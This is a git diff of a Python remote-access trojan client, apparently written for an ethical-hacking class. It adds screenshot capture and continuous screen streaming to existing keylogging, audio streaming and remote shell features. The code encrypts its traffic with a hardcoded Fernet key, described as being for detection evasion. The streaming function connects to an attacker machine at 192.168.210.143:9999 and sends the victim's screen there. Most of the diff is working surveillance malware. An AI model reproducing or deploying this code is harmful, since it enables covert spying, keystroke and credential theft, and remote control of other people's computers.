@@ -1,5 +1,5 @@
 ################################################
-# Authors: Korn D.,                            #
+# Authors: Korn D., Krittanut Y.,              #
 # Class: SIIT Ethical Hacking, 2023-2024       #
 ################################################
 
@@ -12,7 +12,12 @@ import json  # For encoding and decoding data in JSON format
 import os  # For interacting with the operating system
 import pyaudio
 from cryptography.fernet import Fernet  # Encrypted communication for detection evasion
+import mss.tools
 from pynput import keyboard  # For capturing keyboard input
+import mss  # For taking screenshots
+import base64  # For encoding and decoding data in base64 format
+import io # For treating image bytes like a file in memory
+from PIL import Image # To convert raw RGB data to JPEG for compression
 
 # Pre-shared key for encryption
 psk_aes = b'-SDf80BDeTTeY7jFiydQshGVwpufGx4S9J2sANAJWrI=' # Hardcoded cuz I couldn't careless :P
@@ -22,20 +27,25 @@ cipher = Fernet(psk_aes)  # Create a Fernet cipher object for encryption
 def reliable_send(data):
     jsondata = json.dumps(data)  # Convert data to JSON format
     encrypted_data = cipher.encrypt(jsondata.encode())  # Encrypt the JSON data *added*
-    s.send(encrypted_data)  # Send the encrypted data over the network
+    data_len = len(encrypted_data)
+    s.sendall(data_len.to_bytes(4, 'big'))  # Send 4-byte length prefix
+    s.sendall(encrypted_data)
+
 
 # Function to receive data in a reliable way (expects JSON data)
 def reliable_recv():
-    data = b''  # Initialize an empty byte string to hold received data
-    while True:
-        try:
-            data += s.recv(1024)  # Receive data in chunks of 1024 bytes
-            if not data:
-                continue
-            decrypted_data = cipher.decrypt(data)  # Decrypt the received data *added*
-            return json.loads(decrypted_data.decode())  # Parse the received JSON data
-        except ValueError:
-            continue
+    data_len_bytes = s.recv(4)
+    if not data_len_bytes:
+        return None
+    data_len = int.from_bytes(data_len_bytes, 'big')
+    data = b''
+    while len(data) < data_len:
+        packet = s.recv(data_len - len(data))
+        if not packet:
+            return None
+        data += packet
+    decrypted_data = cipher.decrypt(data)
+    return json.loads(decrypted_data.decode())
 
 
 # Function to establish a connection to a remote host
@@ -77,9 +87,12 @@ def download_file(file_name):
 
 log = ""
 keylogger_running = False
-
+t_start = time.time()  # Initialize the start time for the keylogger
 def on_press(key):
-    global log
+    global log, t_start
+    # if more than 20 seconds have passed since the last key press, add new line
+    if time.time() - t_start > 20:
+        log += f"\n[{time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())}] "
     try:
         # Append the pressed key to the log
         log += key.char
@@ -91,12 +104,15 @@ def on_press(key):
             log += '\n'
         else:
             log += f'[{key}]'
+    t_start = time.time()  # Update the start time after each key press
 
 def start_keylogger():
     global keylogger_running
     keylogger_running = True
 
     def run():
+        global log
+        log += f"\n[{time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())}] "
         with keyboard.Listener(on_press=on_press) as listener:
             while keylogger_running:
                 pass
@@ -119,6 +135,7 @@ def retrieve_keylogger_log():
     log = ""  # Clear the log after retrieving it
     return log_data
 
+  
 def stream_audio(sock, flag):
     CHUNK = 1024
     FORMAT = pyaudio.paInt16
@@ -139,6 +156,35 @@ def stream_audio(sock, flag):
         stream.stop_stream()
         stream.close()
         p.terminate()
+        
+
+# Function to take a screenshot and send it to the remote host
+def take_screenshot():
+    with mss.mss() as sct:
+        # Capture the screen
+        screenshot = sct.grab(sct.monitors[0])  # Capture full screen
+        image_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)  # Convert to PNG format
+        encoded_img = base64.b64encode(image_bytes).decode('utf-8')  # Encode the image in base64
+        return encoded_img 
+    
+# Function to start screen streaming
+def stream_screen():
+    try: # Runs in a separate thread and continuously sends screenshots to the server
+        stream_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a TCP socket.
+        stream_socket.connect(('192.168.210.143', 9999)) # Connect to the attacker's machine on port 9999 for streaming.
+        with mss.mss() as sct: # Open a screen capture session using mss
+            while True: # Loop forever to take screenshots
+                screenshots = sct.grab(sct.monitors[1]) # Take a screenshot of the main monitor.
+                img = Image.frombytes('RGB', screenshots.size, screenshots.rgb) # Convert raw RGB data to a PIL image (we can't send raw RGB—it’s too large).
+                buf = io.BytesIO() 
+                img.save(buf, format='JPEG', quality=30) # Create an in-memory buffer and save the image as JPEG (compressed)
+                data = buf.getvalue() # Convert the JPEG image to bytes.
+                size = len(data).to_bytes(4, 'big')  # Prefix the image with a 4-byte size header (so the server knows how many bytes to read).
+                stream_socket.sendall(size + data) # Send size + image together.
+                time.sleep(0.5)  # adjust frame rate (2 FPS)
+    except Exception as e:
+        pass  # don’t crash if connection fails
+
 
 # Main shell function for command execution
 def shell():
@@ -149,8 +195,6 @@ def shell():
         command = reliable_recv()
         if command == 'quit':
             # If the command is 'quit', exit the shell loop
-            print(log)
-            reliable_send(log)
             break
         elif command == 'clear':
             # If the command is 'clear', do nothing (used for clearing the screen)
@@ -187,6 +231,15 @@ def shell():
             if stream_thread:
                 stream_thread.join()
             reliable_send("[*] Audio stream stopped.")
+        elif command == 'screenshot':
+            # If the command is 'screenshot', take a screenshot and send it
+            screenshot_data = take_screenshot()
+            reliable_send(screenshot_data)
+        elif command == 'screen_stream':
+            t = threading.Thread(target=stream_screen)
+            t.daemon = True
+            t.start()
+            reliable_send('[+] Screen streaming started.')
         else:
             try:
                 # For other commands, execute them using subprocess
